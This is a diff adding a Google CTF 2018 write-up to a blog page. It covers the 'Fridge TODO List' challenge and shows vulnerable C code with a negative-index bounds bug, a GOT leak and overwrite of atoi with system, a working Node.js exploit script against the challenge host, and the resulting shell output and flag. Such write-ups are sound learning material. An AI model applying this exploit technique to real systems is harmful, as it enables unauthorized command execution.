@@ -23,7 +23,131 @@
 
     <div class="container"><h1 id="findingcakesatgooglectf2018">Finding Cakes at Google CTF 2018</h1>
 <p>(Intro TODO)</p>
-<h2 id="fridgetodolist">Fridge TODO List</h2></div>
+<h2 id="fridgetodolist">Fridge TODO List</h2>
+<p>The source code of the vulnerable program is included in the attachment.
+Reading over it, it's not hard to see what's vulnerable, but how to exploit it
+is another question:</p>
+<pre><code class="C language-C">// [...]
+
+void store_todo() {
+  printf("In which slot would you like to store the new entry? ");
+  fflush(stdout);
+  int idx = read_int();
+  if (idx &gt; TODO_COUNT) {
+    puts(OUT_OF_BOUNDS_MESSAGE);
+    return;
+  }
+  printf("What's your TODO? ");
+  fflush(stdout);
+  read_line(&amp;todos[idx*TODO_LENGTH], TODO_LENGTH);
+}
+
+void print_todo() {
+  printf("Which entry would you like to read? ");
+  fflush(stdout);
+  int idx = read_int();
+  if (idx &gt; TODO_COUNT) {
+    puts(OUT_OF_BOUNDS_MESSAGE);
+    return;
+  }
+  printf("Your TODO: %s\n", &amp;todos[idx*TODO_LENGTH]);
+}
+
+// [...]
+</code></pre>
+<p>If I enter a negative number, I can read and write data out of bound. However,
+<code>TODO_LENGTH</code> is <code>0x30</code>, with some math and a disassembler, I found places
+that I can access:</p>
+<pre><code>-6  The "write" function in the GOT
+-5  The "strncat" function in the GOT
+-4  The "open" function in the Global Offset Table (GOT)
+-3  Some random place
+-2  Start of "username" buffer
+-1  Middle of "username" buffer
+</code></pre>
+<p>The <code>system</code> function in between <code>write</code> and <code>strncat</code> would allow me to
+execute any shell command, so my goal should be to overwrite the GOT and make
+some other function point to <code>system</code>. Since <code>atoi</code> is used to parse my menu
+choice input, it would be easy to exploit if I can make <code>atoi</code> point to
+<code>system</code>. But there is another problem, modern operating systems have ASLR,
+and a static payload would not work.</p>
+<p>I spent some time creating a 
+<a href="https://github.com/jspenguin2017/Blog/tree/master/tools/lib">Node.js library</a>
+that allow my scripts to react to different server response over <code>netcat</code>.
+Since I can't directly read the address of <code>system</code>, I have to calculate it
+based on something. <code>strncat</code> is already called before I can overwrite the GOT,
+but <code>write</code> is only called when the program is exiting, so the GOT entry should
+be still pointing to the Procedure Linkage Table (PLT). With Hopper
+Disassembler, I determined that the <code>system</code> entry in PLT is <code>0x30</code> below
+<code>write</code>. Hopefully it'll work:</p>
+<pre><code class="JavaScript language-JavaScript">"use strict";
+
+const assert = require("assert");
+const nc = require("./lib/netcat");
+const hex = require("./lib/hexutil");
+
+const conn = new nc("fridge-todo-list.ctfcompetition.com", 1337);
+
+(async () =&gt; {
+    // Log in
+    await conn.read_until("user:");
+    conn.write_line("root");
+
+    await conn.read_until("&gt;");
+    conn.write_line("2");
+
+    // Leak address of "write" in the GOT
+    await conn.read_until("read?");
+    conn.write_line("-6");
+
+    await conn.read_until("TODO: ");
+    let data = await conn.read_until("Hi root");
+
+    const i = data.indexOf("\n\n");
+    assert(i !== -1);
+    data = data.slice(0, i);
+    hex.add(data, 0x30);
+
+    // Overwrite "atoi" with "system", corrupting "open" on the way
+    await conn.read_until("&gt;");
+    conn.write_line("3");
+
+    await conn.read_until("entry?");
+    conn.write_line("-4");
+
+    await conn.read_until("TODO?");
+    conn.write("A".repeat(8)); conn.write(data); conn.write("\n");
+
+    // List directory
+    await conn.read_until("&gt;");
+    conn.write_line("ls -al ./todos");
+})();
+</code></pre>
+<p>Let's try it:</p>
+<pre><code>$ node exploit
+[...]
+&gt; ls -al ./todos
+total 12
+drwxrwxrwt 2 user user   80 Jul  8 03:47 .
+drwxr-xr-x 3 user user 4096 Jun 29 14:38 ..
+-rw-r--r-- 1 user user 6144 Jul  8 03:47 CountZero
+-rw------- 1 user user    0 Jul  8 03:47 root
+[...]
+</code></pre>
+<p>Looks like Wintermuted is using <code>CountZero</code> as his username:</p>
+<pre><code>$ nc fridge-todo-list.ctfcompetition.com 1337
+[...]
+user: CountZero
++=====+=================================================================+
+|   0 | Watch Hackers (again)                                           |
+|   1 | Figure out why the fridge keeps beeping                         |
+|   2 | check /home/user/holey_beep                                     |
+|   3 | debug the fridge - toilet connectivity                          |
+|   4 | follow sec advice: CTF{goo.gl/cjHknW}                           |
++=====+=================================================================+
+[...]
+</code></pre>
+<p>And there is the flag. Check <code>/home/user/holey_beep</code>? What does that mean?</p></div>
 
     <div class="container footer">
         <p>By Hugo Xu (@jspenguin2017)</p>
